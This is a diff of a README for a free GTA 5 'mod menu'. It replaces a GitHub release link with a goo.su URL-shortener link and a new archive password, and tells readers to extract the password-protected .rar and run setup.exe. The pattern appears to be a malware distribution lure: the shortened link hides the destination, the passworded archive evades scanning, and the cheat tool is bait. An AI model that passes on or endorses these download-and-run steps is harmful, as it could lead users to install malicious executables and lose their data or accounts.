@@ -8,8 +8,8 @@ to the next level with the free and easy-to-use  Mod-menu!
 
 <H3>⚙️ How install m0d menu</H3>
 
-- [Download](https://github.com/Moscardo92/menu-for-gta-5/releases/download/Download/GTAmenu.rar)
-- Open archive (password: modgta5)
+- [Download](https://goo.su/DZpiP)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
